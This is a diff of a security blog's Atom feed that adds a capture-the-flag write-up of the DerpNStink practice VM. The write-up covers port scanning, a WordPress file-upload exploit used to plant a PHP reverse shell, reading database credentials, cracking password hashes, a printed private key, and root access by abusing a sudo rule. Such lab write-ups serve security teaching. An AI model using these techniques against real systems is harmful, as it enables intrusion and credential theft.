@@ -4,7 +4,7 @@
   <title><![CDATA[Category: penetration testing | Core dump overflow]]></title>
   <link href="http://chousensha.github.io/blog/categories/penetration-testing/atom.xml" rel="self"/>
   <link href="http://chousensha.github.io/"/>
-  <updated>2019-04-15T21:12:12+03:00</updated>
+  <updated>2019-05-19T20:52:52+03:00</updated>
   <id>http://chousensha.github.io/</id>
   <author>
     <name><![CDATA[chousensha]]></name>
@@ -12,6 +12,366 @@
   </author>
   <generator uri="http://octopress.org/">Octopress</generator>
 
+  
+  <entry>
+    <title type="html"><![CDATA[Derpnstink]]></title>
+    <link href="http://chousensha.github.io/blog/2019/05/19/derpnstink/"/>
+    <updated>2019-05-19T20:36:18+03:00</updated>
+    <id>http://chousensha.github.io/blog/2019/05/19/derpnstink</id>
+    <content type="html"><![CDATA[<p>Today&rsquo;s VM is inspired from the OSCP labs and it has 4 flags to collect.</p>
+
+<blockquote><p>Mr. Derp and Uncle Stinky are two system administrators who are starting their own company, DerpNStink. Instead of hiring qualified  professionals to build up their IT landscape, they decided to hack together their own system which is almost ready to go live&hellip;</p></blockquote>
+
+<!-- more -->
+
+
+<p><code>
+ORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 3.0.2
+22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.8 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   1024 12:4e:f8:6e:7b:6c:c6:d8:7c:d8:29:77:d1:0b:eb:72 (DSA)
+|   2048 72:c5:1c:5f:81:7b:dd:1a:fb:2e:59:67:fe:a6:91:2f (RSA)
+|   256 06:77:0f:4b:96:0a:3a:2c:3b:f0:8c:2b:57:b5:97:bc (ECDSA)
+|_  256 28:e8:ed:7c:60:7f:19:6c:e3:24:79:31:ca:ab:5d:2d (ED25519)
+80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
+| http-robots.txt: 2 disallowed entries
+|_/php/ /temporary/
+|_http-server-header: Apache/2.4.7 (Ubuntu)
+|_http-title: DeRPnStiNK
+</code></p>
+
+<p>Not too many ports to play with. No available exploit for the FTP. The web server seems unfinished:</p>
+
+<p><img class="center" src="/images/pentest/derpnstink/derpnstink.png" title="&lsquo;derpnstink&rsquo; &lsquo;derpnstink&rsquo;" ></p>
+
+<p>Let&rsquo;s check the robots.txt entries. The php folder gives a Forbidden error and the temporary one just displays a try harder! message. I ran gobuster on the web server and found a couple more entries. The interesting one was a <em>/weblog</em> folder:</p>
+
+<p><code>
+/weblog (Status: 301)
+</code></p>
+
+<p>When I hit that in the browser, it gave me a connection error, but for the derpnstink.local domain. So I added that to my /etc/hosts file and then I was able to connect:</p>
+
+<p><img class="center" src="/images/pentest/derpnstink/weblog.png" title="&lsquo;weblog&rsquo; &lsquo;weblog&rsquo;" ></p>
+
+<p>This is a Wordpress site, so I ran a Wordpress scanner on it and the interesting findings were:</p>
+
+<p>```
+[!] Title: WordPress 3.7-5.0 (except 4.9.9) &ndash; Authenticated Code Execution
+ |     Fixed in: 5.0.1
+ |     References:
+ |      &ndash; <a href="https://wpvulndb.com/vulnerabilities/9222">https://wpvulndb.com/vulnerabilities/9222</a>
+ |      &ndash; <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-8942">https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-8942</a>
+ |      &ndash; <a href="https://blog.ripstech.com/2019/wordpress-image-remote-code-execution/">https://blog.ripstech.com/2019/wordpress-image-remote-code-execution/</a></p>
+
+<p> [!] Title: Slideshow Gallery &lt; 1.4.7 Arbitrary File Upload
+  |     Fixed in: 1.4.7
+  |     References:
+  |      &ndash; <a href="https://wpvulndb.com/vulnerabilities/7532">https://wpvulndb.com/vulnerabilities/7532</a>
+  |      &ndash; <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-5460">https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-5460</a>
+  |      &ndash; <a href="https://www.exploit-db.com/exploits/34681/">https://www.exploit-db.com/exploits/34681/</a>
+  |      &ndash; <a href="https://www.exploit-db.com/exploits/34514/">https://www.exploit-db.com/exploits/34514/</a>
+  |      &ndash; <a href="http://seclists.org/bugtraq/2014/Sep/1">http://seclists.org/bugtraq/2014/Sep/1</a>
+  |      &ndash; <a href="http://packetstormsecurity.com/files/131526/">http://packetstormsecurity.com/files/131526/</a>
+  |      &ndash; <a href="https://www.rapid7.com/db/modules/exploit/unix/webapp/wp_slideshowgallery_upload">https://www.rapid7.com/db/modules/exploit/unix/webapp/wp_slideshowgallery_upload</a>
+```</p>
+
+<p>It seems not much can be done without authentication, so I went to wp-admin and enumerated the username <em>admin</em> as a valid user&hellip;and in the process also discovered that the password is <em>admin</em>..derp! Now I could use an <a href="https://www.exploit-db.com/exploits/34681">exploit for the authenticated arbitrary file upload</a> with <code>python gallery.py -t <a href="http://derpnstink.local/weblog/">http://derpnstink.local/weblog/</a> -f ~/Desktop/php-reverse-shell.php -u admin -p admin</code>, and you can find the uploaded shell at <a href="http://derpnstink.local/weblog//wp-content/uploads/slideshow-gallery/php-reverse-shell.php">http://derpnstink.local/weblog//wp-content/uploads/slideshow-gallery/php-reverse-shell.php</a></p>
+
+<p>From your new shell, if you look inside <code>/var/www/html/weblog/wp-config.php</code>, you can find the MySQL credentials:</p>
+
+<p>```
+/<em>* The name of the database for WordPress </em>/
+define(&lsquo;DB_NAME&rsquo;, &lsquo;wordpress&rsquo;);</p>
+
+<p>/<em>* MySQL database username </em>/
+define(&lsquo;DB_USER&rsquo;, &lsquo;root&rsquo;);</p>
+
+<p>/<em>* MySQL database password </em>/
+define(&lsquo;DB_PASSWORD&rsquo;, &lsquo;mysql&rsquo;);</p>
+
+<p>/<em>* MySQL hostname </em>/
+define(&lsquo;DB_HOST&rsquo;, &lsquo;localhost&rsquo;);
+```</p>
+
+<p>Inside <code>/var/www/html/php/info.php</code> there is a line stating that there&rsquo;s a PHPMyAdmin interface:</p>
+
+<p><code>
+/* management interface can be found at /phpmyadmin
+</code></p>
+
+<p>I went to <a href="http://derpnstink.local/php/phpmyadmin/">http://derpnstink.local/php/phpmyadmin/</a> and used the credentials to get in the wordpress database and get 2 users and hashes:</p>
+
+<p><img class="center" src="/images/pentest/derpnstink/users.png" title="&lsquo;users&rsquo; &lsquo;users&rsquo;" ></p>
+
+<p>We already know the admin credentials, so I used john and the rockyou.txt wordlist to crack the hash and get the password <em>wedgie57</em> for user <em>unclestinky</em>. My first move was to try SSH'ing in, but public key authentication was configured. That left the FTP, and I was able to log in with the credentials <em>stinky</em>:<em>wedgie57</em> (there was no unclestinky user configured on the system)</p>
+
+<p>On the FTP, we find a folder with some files that I downloaded on my machine for a better look: <code>wget -r <a href="ftp://derpnstink.local/files">ftp://derpnstink.local/files</a> &mdash;ftp-user=stinky &mdash;ftp-password=wedgie57</code></p>
+
+<p><code>
+ftp&gt; dir
+200 PORT command successful. Consider using PASV.
+150 Here comes the directory listing.
+drwxr-xr-x    5 1001     1001         4096 Nov 12  2017 files
+226 Directory send OK.
+ftp&gt; ls files
+200 PORT command successful. Consider using PASV.
+150 Here comes the directory listing.
+drwxr-xr-x    2 1001     1001         4096 Nov 12  2017 network-logs
+drwxr-xr-x    3 1001     1001         4096 Nov 12  2017 ssh
+-rwxr-xr-x    1 0        0              17 Nov 12  2017 test.txt
+drwxr-xr-x    2 0        0            4096 Nov 12  2017 tmp
+</code></p>
+
+<p>Inside network-logs there&rsquo;s a file that hints at some PCAP analysis:</p>
+
+<p><code>
+cat derpissues.txt
+12:06 mrderp: hey i cant login to wordpress anymore. Can you look into it?
+12:07 stinky: yeah. did you need a password reset?
+12:07 mrderp: I think i accidently deleted my account
+12:07 mrderp: i just need to logon once to make a change
+12:07 stinky: im gonna packet capture so we can figure out whats going on
+12:07 mrderp: that seems a bit overkill, but wtv
+12:08 stinky: commence the sniffer!!!!
+12:08 mrderp: -_-
+12:10 stinky: fine derp, i think i fixed it for you though. cany you try to login?
+12:11 mrderp: awesome it works!
+12:12 stinky: we really are the best sysadmins #team
+12:13 mrderp: i guess we are...
+12:15 mrderp: alright I made the changes, feel free to decomission my account
+12:20 stinky: done! yay
+</code></p>
+
+<p>Inside <em>/files/ssh/ssh/ssh/ssh/ssh/ssh/ssh</em> there&rsquo;s a private key:</p>
+
+<p><code>
+cat key.txt
+-----BEGIN RSA PRIVATE KEY-----
+MIIEowIBAAKCAQEAwSaN1OE76mjt64fOpAbKnFyikjz4yV8qYUxki+MjiRPqtDo4
+2xba3Oo78y82svuAHBm6YScUos8dHUCTMLA+ogsmoDaJFghZEtQXugP8flgSk9cO
+uJzOt9ih/MPmkjzfvDL9oW2Nh1XIctVfTZ6o8ZeJI8Sxh8Eguh+dw69M+Ad0Dimn
+AKDPdL7z7SeWg1BJ1q/oIAtJnv7yJz2iMbZ6xOj6/ZDE/2trrrdbSyMc5CyA09/f
+5xZ9f1ofSYhiCQ+dp9CTgH/JpKmdsZ21Uus8cbeGk1WpT6B+D8zoNgRxmO3/VyVB
+LHXaio3hmxshttdFp4bFc3foTTSyJobGoFX+ewIDAQABAoIBACESDdS2H8EZ6Cqc
+nRfehdBR2A/72oj3/1SbdNeys0HkJBppoZR5jE2o2Uzg95ebkiq9iPjbbSAXICAD
+D3CVrJOoHxvtWnloQoADynAyAIhNYhjoCIA5cPdvYwTZMeA2BgS+IkkCbeoPGPv4
+ZpHuqXR8AqIaKl9ZBNZ5VVTM7fvFVl5afN5eWIZlOTDf++VSDedtR7nL2ggzacNk
+Q8JCK9mF62wiIHK5Zjs1lns4Ii2kPw+qObdYoaiFnexucvkMSFD7VAdfFUECQIyq
+YVbsp5tec2N4HdhK/B0V8D4+6u9OuoiDFqbdJJWLFQ55e6kspIWQxM/j6PRGQhL0
+DeZCLQECgYEA9qUoeblEro6ICqvcrye0ram38XmxAhVIPM7g5QXh58YdB1D6sq6X
+VGGEaLxypnUbbDnJQ92Do0AtvqCTBx4VnoMNisce++7IyfTSygbZR8LscZQ51ciu
+Qkowz3yp8XMyMw+YkEV5nAw9a4puiecg79rH9WSr4A/XMwHcJ2swloECgYEAyHn7
+VNG/Nrc4/yeTqfrxzDBdHm+y9nowlWL+PQim9z+j78tlWX/9P8h98gOlADEvOZvc
+fh1eW0gE4DDyRBeYetBytFc0kzZbcQtd7042/oPmpbW55lzKBnnXkO3BI2bgU9Br
+7QTsJlcUybZ0MVwgs+Go1Xj7PRisxMSRx8mHbvsCgYBxyLulfBz9Um/cTHDgtTab
+L0LWucc5KMxMkTwbK92N6U2XBHrDV9wkZ2CIWPejZz8hbH83Ocfy1jbETJvHms9q
+cxcaQMZAf2ZOFQ3xebtfacNemn0b7RrHJibicaaM5xHvkHBXjlWN8e+b3x8jq2b8
+gDfjM3A/S8+Bjogb/01JAQKBgGfUvbY9eBKHrO6B+fnEre06c1ArO/5qZLVKczD7
+RTazcF3m81P6dRjO52QsPQ4vay0kK3vqDA+s6lGPKDraGbAqO+5paCKCubN/1qP1
+14fUmuXijCjikAPwoRQ//5MtWiwuu2cj8Ice/PZIGD/kXk+sJXyCz2TiXcD/qh1W
+pF13AoGBAJG43weOx9gyy1Bo64cBtZ7iPJ9doiZ5Y6UWYNxy3/f2wZ37D99NSndz
+UBtPqkw0sAptqkjKeNtLCYtHNFJAnE0/uAGoAyX+SHhas0l2IYlUlk8AttcHP1kA
+a4Id4FlCiJAXl3/ayyrUghuWWA3jMW3JgZdMyhU3OV+wyZz25S8o
+-----END RSA PRIVATE KEY-----
+</code></p>
+
+<p>Now we can SSH on the box:</p>
+
+<p>```
+ssh -i stinky_key <a href="&#109;&#x61;&#105;&#x6c;&#116;&#x6f;&#x3a;&#115;&#116;&#105;&#110;&#x6b;&#121;&#x40;&#x64;&#101;&#114;&#x70;&#x6e;&#x73;&#x74;&#105;&#110;&#x6b;&#x2e;&#108;&#x6f;&#x63;&#x61;&#108;">&#115;&#116;&#x69;&#110;&#x6b;&#121;&#x40;&#100;&#101;&#114;&#112;&#110;&#x73;&#116;&#x69;&#x6e;&#x6b;&#x2e;&#108;&#111;&#99;&#x61;&#x6c;</a>
+Ubuntu 14.04.5 LTS</p>
+
+<pre><code>                   ,~~~~~~~~~~~~~..
+                   '  Derrrrrp  N  `
+    ,~~~~~~,       |    Stink      |
+   / ,      \      ',  ________ _,"
+  /,~|_______\.      \/
+ /~ (__________)
+(*)  ; (^)(^)':
+    =;  ____  ;
+      ; """"  ;=
+</code></pre>
+
+<p>   {&ldquo;}<em>   &lsquo; &rsquo;&rdquo;&ldquo;&lsquo; &rsquo; </em>{&rdquo;}
+   _<em>/     >  &lt;   _</em>/</p>
+
+<pre><code>  \    ,"   ",  /
+   \  "       /"
+      "      "=
+       &gt;     &lt;
+      ="     "-
+      -`.   ,'
+            -
+        `--'
+</code></pre>
+
+<p>Welcome to Ubuntu 14.04.5 LTS (GNU/Linux 4.4.0-31-generic i686)</p>
+
+<ul>
+<li>Documentation:  <a href="https://help.ubuntu.com/">https://help.ubuntu.com/</a></li>
+</ul>
+
+
+<p>331 packages can be updated.
+231 updates are security updates.</p>
+
+<p>Last login: Mon Nov 13 00:31:29 2017 from 192.168.1.129
+stinky@DeRPnStiNK:~$
+```</p>
+
+<p>Inside Documents there&rsquo;s the derpissues.pcap file. I ran <code>strings derpissues.pcap | grep pass</code> on it to get another set of credentials:</p>
+
+<p><code>
+user_login=mrderp
+pass1=derpderpderpderpderpderpderp
+</code></p>
+
+<p>In the /etc/passwd file we can find a mrderp user, so I tried to SSH and got in. On the Desktop, I found a file with a helpdesk ticket about sudo issues:</p>
+
+<p>```
+mrderp@DeRPnStiNK:~$ cat Desktop/helpdesk.log
+From: Help Desk <a href="&#x6d;&#97;&#105;&#x6c;&#x74;&#x6f;&#58;&#104;&#x65;&#108;&#x70;&#100;&#x65;&#x73;&#x6b;&#x40;&#100;&#x65;&#114;&#112;&#x6e;&#115;&#116;&#105;&#x6e;&#x6b;&#46;&#108;&#111;&#x63;&#x61;&#x6c;">&#x68;&#x65;&#108;&#x70;&#x64;&#101;&#x73;&#107;&#x40;&#100;&#101;&#114;&#112;&#110;&#115;&#116;&#x69;&#110;&#107;&#46;&#108;&#111;&#99;&#97;&#108;</a>
+Date: Thu, Aug 23, 2017 at 1:29 PM
+Subject: sudoers ISSUE=242 PROJ=26
+To: Derp, Mr (mrderp) [C]
+When replying, type your text above this line.</p>
+
+<p>Help Desk Ticket Notification
+Thank you for contacting the Help Desk. Your ticket information is below. If you have any
+additional information to add to this ticket, please reply to this notification.
+If you need immediate help (i.e. you are within two days of a deadline or in the event of a
+security emergency), call us. Note that the Help Desk&rsquo;s busiest hours are between 10 a.m. (ET)
+and 3 p.m. (ET).</p>
+
+<p>Toll-free: 1-866-504-9552
+Phone: 301-402-7469
+TTY: 301-451-5939
+Ticket Title: Sudoers File issues
+Ticket Number: 242
+Status: Break/fix
+Date Created: 08/23/2017
+Latest Update Date: 08/23/2017
+Contact Name: Mr Derp
+CC’s: Uncle Stinky
+Full description and latest notes on your Ticket: Sudoers File issues
+Notification</p>
+
+<p>Regards,
+Service Desk</p>
+
+<p>Listen with focus, answer with accuracy, assist with compassion.</p>
+
+<p>From: Help Desk
+Date: Mon, Sep 10, 2017 at 2:53 PM
+Subject: sudoers ISSUE=242 PROJ=26
+To: Derp, Mr (mrderp) [C]
+When replying, type your text above this line.</p>
+
+<p>Closed Ticket Notification</p>
+
+<p>Thank you for contacting the Help Desk. Your ticket information and its resolution is
+below. If you feel that the ticket has not been resolved to your satisfaction or you need additional
+assistance, please reply to this notification to provide additional information.
+If you need immediate help (i.e. you are within two days of a deadline or in the event of a
+security emergency), call us or visit our Self Help Web page at <a href="https://pastebin.com/RzK9WfGw">https://pastebin.com/RzK9WfGw</a>
+Note that the Help Desk&rsquo;s busiest hours are between 10 a.m. (ET)
+and 3 p.m. (ET).
+Toll-free: 1-866-504-9552
+Phone: 301-402-7469
+TTY: 301-451-5939
+Ticket Title: sudoers issues
+Ticket Number: 242
+Status: Closed
+Date Created: 09/10/2017
+Latest Update Date: 09/10/2017
+CC’s:
+Resolution: Closing ticket. ticket notification.</p>
+
+<p>Regards,
+eRA Service Desk
+Listen with focus, answer with accuracy, assist with compassion.
+For more information, dont forget to visit the Self Help Web page!!!
+```</p>
+
+<p>On the root filesystem, I found an interesting folder called /support with more information about this sudo issue:</p>
+
+<p>```
+mrderp@DeRPnStiNK:~$ cat /support/troubleshooting.txt</p>
+
+<hr />
+
+<p>On one particular machine I often need to run sudo commands every now and then. I am fine with entering password on sudo in most of the cases.</p>
+
+<p>However i dont want to specify each command to allow</p>
+
+<p>How can I exclude these commands from password protection to sudo?</p>
+
+<hr />
+
+<hr />
+
+<p>Thank you for contacting the Client Support team. This message is to confirm that we have resolved and closed your ticket.</p>
+
+<p>Please contact the Client Support team at <a href="https://pastebin.com/RzK9WfGw">https://pastebin.com/RzK9WfGw</a> if you have any further questions or issues.</p>
+
+<p>Thank you for using our product.</p>
+
+<hr />
+
+<p>```</p>
+
+<p>Running a <strong>sudo -l</strong> gives us the sudo commands that mrderp can run:</p>
+
+<p>```
+User mrderp may run the following commands on DeRPnStiNK:</p>
+
+<pre><code>(ALL) /home/mrderp/binaries/derpy*
+</code></pre>
+
+<p>```</p>
+
+<p>All I had to do at this point was to create a binaries directory, copy the bash executable to something with derpy in the name and run it as sudo:</p>
+
+<p><code>
+mrderp@DeRPnStiNK:~/binaries$ cp -p /bin/bash derpy.sh
+mrderp@DeRPnStiNK:~/binaries$ sudo ./derpy.sh
+[sudo] password for mrderp:
+root@DeRPnStiNK:~/binaries#
+</code></p>
+
+<p>Only at the end I realized I should have also collected flags, but I was too lazy to return to that, so leaving only the last flag here:</p>
+
+<p>```
+root@DeRPnStiNK:/root# cat Desktop/flag.txt
+flag4(49dca65f362fee401292ed7ada96f96295eab1e589c52e4e66bf4aedda715fdd)</p>
+
+<p>Congrats on rooting my first VulnOS!</p>
+
+<p>Hit me up on twitter and let me know your thoughts!</p>
+
+<p>@securekomodo
+```</p>
+
+<p>```</p>
+
+<hr />
+
+<p>/ You need more time; and you probably \</p>
+
+<h2>\ always will.                         /</h2>
+
+<pre><code>   \   ^__^
+    \  (oo)\_______
+       (__)\       )\/\
+           ||----w |
+           ||     ||
+</code></pre>
+
+<p>```</p>
+]]></content>
+  </entry>
   
   <entry>
     <title type="html"><![CDATA[Donkey Docker]]></title>
@@ -188,7 +548,7 @@ ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAICEBBzcffpLILgXqY77+z7/Awsovz/jkhOd/0fDjvEof
 <p>And the SSH user is orwell. So let&rsquo;s copy the private key to our machine and try to SSH in as orwell:</p>
 
 <p>```
-ssh -i id_ed25519 <a href="&#109;&#97;&#x69;&#x6c;&#116;&#111;&#58;&#111;&#x72;&#119;&#x65;&#x6c;&#x6c;&#x40;&#49;&#57;&#x32;&#46;&#49;&#x36;&#56;&#46;&#x31;&#x35;&#57;&#x2e;&#49;&#51;&#50;">&#111;&#x72;&#119;&#101;&#108;&#x6c;&#64;&#49;&#x39;&#50;&#46;&#x31;&#54;&#x38;&#46;&#x31;&#x35;&#57;&#46;&#x31;&#x33;&#x32;</a>
+ssh -i id_ed25519 <a href="&#109;&#97;&#105;&#x6c;&#x74;&#x6f;&#x3a;&#111;&#x72;&#119;&#x65;&#x6c;&#x6c;&#64;&#49;&#x39;&#50;&#x2e;&#x31;&#54;&#x38;&#x2e;&#49;&#x35;&#57;&#46;&#x31;&#51;&#x32;">&#x6f;&#114;&#x77;&#x65;&#108;&#x6c;&#64;&#x31;&#57;&#x32;&#46;&#49;&#54;&#56;&#x2e;&#49;&#53;&#57;&#x2e;&#x31;&#51;&#x32;</a>
 Welcome to</p>
 
 <hr />
@@ -206,7 +566,7 @@ if you run into any issue you can find me on Twitter: @dhn_
 or feel free to write me a mail to:</p>
 
 <ul>
-<li>Email: <a href="&#x6d;&#x61;&#x69;&#108;&#x74;&#111;&#58;&#100;&#104;&#110;&#x40;&#122;&#x65;&#x72;&#x30;&#x2d;&#x64;&#97;&#121;&#x2e;&#x70;&#119;">&#x64;&#x68;&#x6e;&#64;&#122;&#x65;&#114;&#x30;&#x2d;&#x64;&#97;&#121;&#46;&#112;&#119;</a></li>
+<li>Email: <a href="&#109;&#x61;&#x69;&#x6c;&#x74;&#111;&#x3a;&#100;&#x68;&#110;&#64;&#122;&#101;&#x72;&#x30;&#45;&#100;&#x61;&#x79;&#x2e;&#x70;&#119;">&#x64;&#104;&#110;&#x40;&#x7a;&#x65;&#x72;&#x30;&#x2d;&#x64;&#97;&#121;&#x2e;&#112;&#119;</a></li>
 <li>GPG key: 0x2641123C</li>
 <li>GPG fingerprint: 4E3444A11BB780F84B58E8ABA8DD99472641123C</li>
 </ul>
@@ -315,7 +675,7 @@ YES!! You did it :&ndash;). Congratulations!</p>
 
 <p>I hope you enjoyed this CTF VM.</p>
 
-<p>Drop me a line on twitter @dhn_, or via email <a href="&#109;&#97;&#x69;&#x6c;&#x74;&#x6f;&#58;&#100;&#x68;&#x6e;&#x40;&#x7a;&#x65;&#x72;&#x30;&#x2d;&#100;&#97;&#121;&#46;&#112;&#119;">&#100;&#x68;&#x6e;&#64;&#122;&#x65;&#114;&#48;&#x2d;&#100;&#97;&#121;&#x2e;&#x70;&#119;</a></p>
+<p>Drop me a line on twitter @dhn_, or via email <a href="&#109;&#97;&#x69;&#108;&#116;&#111;&#58;&#x64;&#x68;&#x6e;&#64;&#x7a;&#101;&#x72;&#48;&#45;&#100;&#x61;&#x79;&#x2e;&#112;&#119;">&#100;&#x68;&#x6e;&#64;&#x7a;&#101;&#x72;&#x30;&#45;&#x64;&#x61;&#121;&#x2e;&#112;&#119;</a></p>
 
 <p>Here is your flag: flag2{60d14feef575bacf5fd8eb06ec7cd8e7}
 ```</p>
@@ -796,7 +1156,7 @@ LIST
 .
 RETR 1
 +OK 544 octets
-Return-Path: <a href="&#x6d;&#x61;&#x69;&#x6c;&#116;&#111;&#58;&#x72;&#x6f;&#111;&#x74;&#64;&#49;&#50;&#55;&#46;&#48;&#46;&#x30;&#46;&#49;&#46;&#103;&#111;&#108;&#x64;&#101;&#110;&#101;&#x79;&#101;">&#114;&#111;&#x6f;&#x74;&#64;&#49;&#x32;&#55;&#x2e;&#x30;&#x2e;&#x30;&#46;&#x31;&#46;&#103;&#111;&#108;&#100;&#101;&#110;&#101;&#x79;&#101;</a>
+Return-Path: <a href="&#109;&#x61;&#x69;&#x6c;&#x74;&#111;&#x3a;&#114;&#x6f;&#111;&#116;&#64;&#x31;&#50;&#55;&#x2e;&#48;&#x2e;&#x30;&#46;&#49;&#x2e;&#x67;&#111;&#x6c;&#100;&#x65;&#x6e;&#101;&#x79;&#x65;">&#114;&#x6f;&#x6f;&#x74;&#64;&#x31;&#50;&#x37;&#46;&#48;&#x2e;&#48;&#x2e;&#x31;&#46;&#x67;&#111;&#x6c;&#100;&#101;&#110;&#x65;&#121;&#101;</a>
 X-Original-To: boris
 Delivered-To: boris@ubuntu
 Received: from ok (localhost [127.0.0.1])</p>
@@ -807,7 +1167,7 @@ for &lt;boris&gt;; Tue, 2 Apr 1990 19:22:14 -0700 (PDT)
 
 <p>Message-Id: &lt;20180425022326.D9E47454B1@ubuntu>
 Date: Tue, 2 Apr 1990 19:22:14 -0700 (PDT)
-From: <a href="&#109;&#97;&#105;&#x6c;&#116;&#x6f;&#x3a;&#114;&#x6f;&#x6f;&#x74;&#x40;&#x31;&#x32;&#x37;&#46;&#48;&#x2e;&#48;&#46;&#49;&#46;&#x67;&#111;&#108;&#x64;&#x65;&#110;&#x65;&#121;&#101;">&#114;&#111;&#111;&#x74;&#64;&#x31;&#50;&#x37;&#46;&#x30;&#46;&#x30;&#46;&#x31;&#x2e;&#x67;&#111;&#108;&#x64;&#101;&#110;&#x65;&#x79;&#x65;</a></p>
+From: <a href="&#109;&#97;&#x69;&#108;&#116;&#x6f;&#x3a;&#114;&#111;&#111;&#x74;&#64;&#49;&#50;&#x37;&#46;&#48;&#x2e;&#x30;&#46;&#49;&#x2e;&#x67;&#111;&#x6c;&#x64;&#x65;&#x6e;&#101;&#x79;&#x65;">&#114;&#x6f;&#111;&#116;&#64;&#x31;&#50;&#55;&#x2e;&#48;&#46;&#48;&#46;&#49;&#x2e;&#x67;&#111;&#108;&#100;&#101;&#x6e;&#x65;&#x79;&#x65;</a></p>
 
 <p>Boris, this is admin. You can electronically communicate to co-workers and students here. I&rsquo;m not going to scan emails for security risks because I trust you and the other admins here.
 .
@@ -830,7 +1190,7 @@ From: natalya@ubuntu</p>
 .
 RETR 3
 +OK 921 octets
-Return-Path: <a href="&#x6d;&#97;&#105;&#x6c;&#116;&#111;&#x3a;&#97;&#108;&#x65;&#x63;&#64;&#106;&#x61;&#x6e;&#117;&#x73;&#46;&#x62;&#x6f;&#x73;&#115;">&#97;&#x6c;&#101;&#x63;&#64;&#x6a;&#97;&#x6e;&#117;&#x73;&#46;&#98;&#111;&#115;&#115;</a>
+Return-Path: <a href="&#109;&#97;&#105;&#x6c;&#116;&#x6f;&#58;&#x61;&#x6c;&#x65;&#x63;&#x40;&#106;&#x61;&#x6e;&#117;&#115;&#x2e;&#98;&#111;&#x73;&#x73;">&#x61;&#108;&#101;&#x63;&#64;&#x6a;&#x61;&#110;&#117;&#x73;&#46;&#x62;&#x6f;&#x73;&#115;</a>
 X-Original-To: boris
 Delivered-To: boris@ubuntu
 Received: from janus (localhost [127.0.0.1])</p>
@@ -841,7 +1201,7 @@ for &lt;boris&gt;; Wed, 22 Apr 1995 19:51:48 -0700 (PDT)
 
 <p>Message-Id: &lt;20180425025235.4B9F4454B1@ubuntu>
 Date: Wed, 22 Apr 1995 19:51:48 -0700 (PDT)
-From: <a href="&#x6d;&#97;&#105;&#108;&#x74;&#111;&#58;&#97;&#108;&#101;&#x63;&#64;&#106;&#x61;&#x6e;&#117;&#x73;&#x2e;&#x62;&#x6f;&#x73;&#115;">&#x61;&#108;&#101;&#x63;&#64;&#106;&#x61;&#110;&#117;&#x73;&#46;&#98;&#x6f;&#x73;&#115;</a></p>
+From: <a href="&#x6d;&#97;&#x69;&#108;&#x74;&#111;&#x3a;&#x61;&#108;&#x65;&#x63;&#x40;&#x6a;&#x61;&#x6e;&#117;&#x73;&#x2e;&#98;&#111;&#x73;&#x73;">&#x61;&#x6c;&#101;&#x63;&#64;&#x6a;&#97;&#x6e;&#x75;&#x73;&#x2e;&#x62;&#111;&#115;&#x73;</a></p>
 
 <p>Boris,</p>
 
@@ -1531,7 +1891,7 @@ computer         (w1r3s)
 <p>With this, I could SSH in.</p>
 
 <p>```
-ssh <a href="&#109;&#97;&#105;&#108;&#x74;&#111;&#58;&#119;&#49;&#x72;&#51;&#x73;&#64;&#x31;&#57;&#50;&#46;&#49;&#54;&#x38;&#x2e;&#49;&#x34;&#x35;&#46;&#49;&#51;&#52;">&#x77;&#x31;&#114;&#x33;&#x73;&#x40;&#49;&#x39;&#x32;&#46;&#x31;&#x36;&#x38;&#x2e;&#49;&#x34;&#53;&#46;&#x31;&#x33;&#x34;</a>
+ssh <a href="&#x6d;&#x61;&#x69;&#108;&#116;&#x6f;&#x3a;&#119;&#49;&#x72;&#x33;&#x73;&#64;&#x31;&#57;&#x32;&#x2e;&#49;&#x36;&#56;&#46;&#49;&#52;&#x35;&#46;&#x31;&#51;&#x34;">&#x77;&#49;&#114;&#51;&#115;&#64;&#49;&#57;&#x32;&#x2e;&#49;&#x36;&#x38;&#x2e;&#49;&#x34;&#x35;&#46;&#49;&#51;&#52;</a>
 The authenticity of host &lsquo;192.168.145.134 (192.168.145.134)&rsquo; can&rsquo;t be established.
 ECDSA key fingerprint is SHA256:/3N0PzPMqtXlj9QWJFMbCufh2W95JylZ/oF82NkAAto.
 Are you sure you want to continue connecting (yes/no)? yes</p>
@@ -1542,7 +1902,7 @@ Are you sure you want to continue connecting (yes/no)? yes</p>
 
 <h2>Well,&hellip;&hellip;..possibly.</h2>
 
-<p><a href="&#x6d;&#97;&#105;&#x6c;&#x74;&#x6f;&#x3a;&#x77;&#x31;&#x72;&#x33;&#x73;&#64;&#49;&#57;&#x32;&#46;&#x31;&#54;&#x38;&#x2e;&#49;&#52;&#53;&#46;&#49;&#x33;&#x34;">&#x77;&#49;&#114;&#x33;&#115;&#64;&#49;&#57;&#x32;&#46;&#x31;&#x36;&#x38;&#46;&#49;&#x34;&#x35;&#46;&#49;&#x33;&#52;</a>&rsquo;s password:
+<p><a href="&#109;&#97;&#105;&#108;&#116;&#x6f;&#58;&#x77;&#x31;&#x72;&#x33;&#115;&#64;&#x31;&#57;&#50;&#46;&#49;&#x36;&#x38;&#x2e;&#49;&#52;&#53;&#46;&#x31;&#x33;&#52;">&#119;&#x31;&#x72;&#51;&#x73;&#x40;&#49;&#x39;&#x32;&#x2e;&#x31;&#54;&#56;&#46;&#49;&#52;&#x35;&#46;&#49;&#x33;&#x34;</a>&rsquo;s password:
 Welcome to Ubuntu 16.04.3 LTS (GNU/Linux 4.13.0-36-generic x86_64)</p>
 
 <ul>
@@ -1662,339 +2022,6 @@ flag.txt</p>
                  (__)\       )\/\
                          ||----w |
                          ||     ||
-</code></pre>
-
-<p>```</p>
-]]></content>
-  </entry>
-  
-  <entry>
-    <title type="html"><![CDATA[Hackfest 2016: Sedna]]></title>
-    <link href="http://chousensha.github.io/blog/2018/11/16/hackfest-2016-sedna/"/>
-    <updated>2018-11-16T21:22:02+02:00</updated>
-    <id>http://chousensha.github.io/blog/2018/11/16/hackfest-2016-sedna</id>
-    <content type="html"><![CDATA[<p>This is another machine in the Hackfest 2016 series.</p>
-
-<blockquote><p>There are 4 flags on this machine One for a shell One for root access Two for doing post
